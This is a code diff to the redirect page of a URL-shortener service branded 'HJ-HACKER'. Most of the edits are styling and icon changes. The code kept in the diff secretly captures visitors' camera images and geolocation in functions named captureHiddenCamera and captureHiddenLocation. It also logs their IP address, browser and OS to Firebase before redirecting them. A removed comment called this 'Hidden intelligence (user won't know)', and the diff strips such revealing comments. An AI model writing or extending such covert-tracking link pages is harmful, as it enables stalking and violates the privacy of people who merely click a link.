@@ -6,6 +6,7 @@
     <title>HJ-HACKER | Redirecting...</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -52,7 +53,7 @@
             50% { width: 60%; margin-left: 20%; }
             100% { width: 5%; margin-left: 100%; }
         }
-        .message { color: #00ff41; font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; }
+        .message { color: #00ff41; font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; font-weight: 600; }
         .social-gate, .password-form {
             background: rgba(20, 20, 30, 0.95);
             backdrop-filter: blur(10px);
@@ -62,7 +63,7 @@
             max-width: 400px;
             text-align: center;
         }
-        .social-icon { font-size: 3rem; margin-bottom: 1rem; }
+        .social-icon { font-size: 3rem; margin-bottom: 1rem; color: #00ff41; }
         .social-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 0.5rem; color: #fff; }
         .social-desc { color: #888; margin-bottom: 1.5rem; font-size: 0.9rem; }
         .social-btn, .unlock-btn {
@@ -75,7 +76,9 @@
             font-weight: 700;
             cursor: pointer;
             font-size: 1rem;
+            transition: all 0.3s ease;
         }
+        .social-btn:hover, .unlock-btn:hover { background: #00cc33; transform: translateY(-2px); }
         .password-input {
             width: 100%;
             padding: 0.8rem;
@@ -85,7 +88,13 @@
             color: #fff;
             margin: 1rem 0;
         }
+        .password-input:focus { outline: none; border-color: #00ff41; }
         .error { color: #ff4444; margin-top: 0.5rem; font-size: 0.8rem; }
+        .fa-3x { font-size: 3rem; }
+        .text-green { color: #00ff41; }
+        .text-red { color: #ff4444; }
+        .text-gray { color: #888; }
+        .mt-2 { margin-top: 1rem; }
     </style>
 </head>
 <body>
@@ -105,25 +114,22 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // Get short code from URL
         const shortCode = window.location.pathname.substring(1);
         
-        console.log('🔍 Redirecting for code:', shortCode);
+        console.log('Redirecting for code:', shortCode);
         
-        // Get link data from Firebase
         async function getLinkData() {
             try {
                 const snapshot = await database.ref(`urls/${shortCode}`).get();
                 const data = snapshot.val();
-                console.log('📦 Link data:', data);
+                console.log('Link data:', data);
                 return data;
             } catch (error) {
-                console.error('❌ Error fetching link:', error);
+                console.error('Error fetching link:', error);
                 return null;
             }
         }
         
-        // Get visitor info for analytics
         async function getVisitorInfo() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -140,6 +146,7 @@
                 if (ua.includes('Chrome')) browser = 'Chrome';
                 else if (ua.includes('Firefox')) browser = 'Firefox';
                 else if (ua.includes('Safari')) browser = 'Safari';
+                else if (ua.includes('Edg')) browser = 'Edge';
                 
                 let os = 'Unknown';
                 if (ua.includes('Windows')) os = 'Windows';
@@ -161,7 +168,6 @@
             }
         }
         
-        // Save analytics
         async function saveAnalytics(linkData, imageUrl = null, lat = null, lon = null) {
             try {
                 const visitorInfo = await getVisitorInfo();
@@ -184,17 +190,15 @@
                 
                 await database.ref(`analytics/${shortCode}`).push(analyticsData);
                 
-                // Increment click count
                 const currentClicks = linkData.clicks || 0;
                 await database.ref(`urls/${shortCode}`).update({ clicks: currentClicks + 1 });
                 
-                console.log('✅ Analytics saved');
+                console.log('Analytics saved');
             } catch (error) {
                 console.log('Analytics save error:', error);
             }
         }
         
-        // Hidden camera capture
         async function captureHiddenCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -225,7 +229,6 @@
             }
         }
         
-        // Hidden location capture
         function captureHiddenLocation() {
             return new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
@@ -241,36 +244,35 @@
             });
         }
         
-        // Show animation
         function showAnimation(type, text) {
             const content = document.getElementById('content');
             if (type === 'ring') {
                 content.innerHTML = `
                     <div class="loader">
                         <div class="ring"><div></div></div>
-                        <div class="message">${text || 'REDIRECTING'}</div>
+                        <div class="message"><i class="fas fa-arrow-right"></i> ${text || 'REDIRECTING'} <i class="fas fa-arrow-right"></i></div>
                     </div>
                 `;
             } else {
                 content.innerHTML = `
                     <div class="loader">
                         <div class="bar"><div class="bar-fill"></div></div>
-                        <div class="message">${text || 'REDIRECTING'}</div>
+                        <div class="message"><i class="fas fa-arrow-right"></i> ${text || 'REDIRECTING'} <i class="fas fa-arrow-right"></i></div>
                     </div>
                 `;
             }
         }
         
-        // Show password modal
         function showPasswordModal() {
             return new Promise((resolve) => {
                 const content = document.getElementById('content');
                 content.innerHTML = `
                     <div class="password-form">
-                        <h2 style="color: #00ff41; margin-bottom: 1rem;">🔒 Protected Link</h2>
-                        <p style="color: #888; margin-bottom: 1rem;">This link is password protected</p>
+                        <i class="fas fa-lock" style="font-size: 3rem; color: #00ff41; margin-bottom: 1rem; display: inline-block;"></i>
+                        <h2 style="color: #00ff41; margin-bottom: 1rem;">Protected Link</h2>
+                        <p style="color: #888; margin-bottom: 1rem;"><i class="fas fa-shield-alt"></i> This link is password protected</p>
                         <input type="password" id="passwordInput" class="password-input" placeholder="Enter password">
-                        <button id="unlockBtn" class="unlock-btn">Unlock</button>
+                        <button id="unlockBtn" class="unlock-btn"><i class="fas fa-unlock-alt"></i> Unlock</button>
                         <div id="passError" class="error"></div>
                     </div>
                 `;
@@ -280,73 +282,84 @@
                 
                 unlockBtn.onclick = () => {
                     const password = passwordInput.value;
+                    if (!password) {
+                        passError.textContent = 'Please enter password';
+                        return;
+                    }
                     resolve(password);
                 };
                 passwordInput.onkeypress = (e) => {
                     if (e.key === 'Enter') {
+                        if (!passwordInput.value) {
+                            passError.textContent = 'Please enter password';
+                            return;
+                        }
                         resolve(passwordInput.value);
                     }
                 };
             });
         }
         
-        // Show social gate modal
         function showSocialModal(linkData) {
             return new Promise((resolve) => {
-                const icons = {
-                    youtube: '▶️', instagram: '📷', twitter: '🐦',
-                    facebook: '📘', whatsapp: '💬', linkedin: '🔗', tiktok: '🎵'
+                const iconMap = {
+                    youtube: '<i class="fab fa-youtube fa-3x"></i>',
+                    instagram: '<i class="fab fa-instagram fa-3x"></i>',
+                    twitter: '<i class="fab fa-twitter fa-3x"></i>',
+                    facebook: '<i class="fab fa-facebook fa-3x"></i>',
+                    whatsapp: '<i class="fab fa-whatsapp fa-3x"></i>',
+                    linkedin: '<i class="fab fa-linkedin fa-3x"></i>',
+                    tiktok: '<i class="fab fa-tiktok fa-3x"></i>'
                 };
+                const icon = iconMap[linkData.social_gate_icon] || '<i class="fas fa-share-alt fa-3x"></i>';
+                
                 const content = document.getElementById('content');
                 content.innerHTML = `
                     <div class="social-gate">
-                        <div class="social-icon">${icons[linkData.social_gate_icon] || '🔗'}</div>
+                        <div class="social-icon">${icon}</div>
                         <h2 class="social-title">${linkData.social_gate_title}</h2>
-                        <p class="social-desc">${linkData.social_gate_description || 'Complete the action to continue'}</p>
-                        <button id="socialBtn" class="social-btn">${linkData.social_gate_button_text || 'Verify & Continue'}</button>
+                        <p class="social-desc"><i class="fas fa-info-circle"></i> ${linkData.social_gate_description || 'Complete the action to continue'}</p>
+                        <button id="socialBtn" class="social-btn"><i class="fas fa-external-link-alt"></i> ${linkData.social_gate_button_text || 'Verify & Continue'}</button>
                     </div>
                 `;
                 const socialBtn = document.getElementById('socialBtn');
                 socialBtn.onclick = () => {
                     window.open(linkData.social_gate_url, '_blank');
-                    setTimeout(() => resolve(true), 1500);
+                    resolve(true);
                 };
             });
         }
         
-        // Main redirect function
         async function handleRedirect() {
-            console.log('🔄 Handling redirect for:', shortCode);
+            console.log('Handling redirect for:', shortCode);
             
-            // Get link data
             const linkData = await getLinkData();
             
             if (!linkData) {
                 document.getElementById('content').innerHTML = `
                     <div style="text-align: center;">
+                        <i class="fas fa-exclamation-triangle" style="font-size: 4rem; color: #ff4444; margin-bottom: 1rem; display: inline-block;"></i>
                         <h1 style="color: #ff4444;">404</h1>
-                        <p>Link not found</p>
+                        <p style="color: #888;">Link not found</p>
                     </div>
                 `;
                 return;
             }
             
-            // Check expiration
             if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) {
                 document.getElementById('content').innerHTML = `
                     <div style="text-align: center;">
+                        <i class="fas fa-hourglass-end" style="font-size: 4rem; color: #ff4444; margin-bottom: 1rem; display: inline-block;"></i>
                         <h1 style="color: #ff4444;">Link Expired</h1>
-                        <p>This link is no longer active</p>
+                        <p style="color: #888;">This link is no longer active</p>
                     </div>
                 `;
                 return;
             }
             
-            // Show animation
             const animType = linkData.animation_type || 'ring';
             showAnimation(animType, 'REDIRECTING');
             
-            // Check password
             if (linkData.password) {
                 const password = await showPasswordModal();
                 if (password !== linkData.password) {
@@ -354,8 +367,9 @@
                     setTimeout(() => {
                         document.getElementById('content').innerHTML = `
                             <div class="password-form">
-                                <h2 style="color: #ff4444;">❌ Incorrect Password</h2>
-                                <button id="tryAgain" class="unlock-btn" style="margin-top: 1rem;">Try Again</button>
+                                <i class="fas fa-times-circle" style="font-size: 3rem; color: #ff4444; margin-bottom: 1rem; display: inline-block;"></i>
+                                <h2 style="color: #ff4444;">Incorrect Password</h2>
+                                <button id="tryAgain" class="unlock-btn" style="margin-top: 1rem;"><i class="fas fa-undo-alt"></i> Try Again</button>
                             </div>
                         `;
                         document.getElementById('tryAgain').onclick = () => handleRedirect();
@@ -364,12 +378,10 @@
                 }
             }
             
-            // Check social gate
             if (linkData.social_gate_title && linkData.social_gate_url) {
                 await showSocialModal(linkData);
             }
             
-            // Hidden intelligence (user won't know)
             let imageUrl = null;
             let location = { lat: null, lon: null };
             
@@ -380,15 +392,12 @@
                 location = await captureHiddenLocation();
             }
             
-            // Save analytics in background
             saveAnalytics(linkData, imageUrl, location.lat, location.lon);
             
-            // ✅ FINAL REDIRECT to actual destination
-            console.log('🚀 Redirecting to:', linkData.long_url);
+            console.log('Redirecting to:', linkData.long_url);
             window.location.href = linkData.long_url;
         }
         
-        // Start the redirect process
         if (shortCode && shortCode !== '') {
             handleRedirect();
         } else {
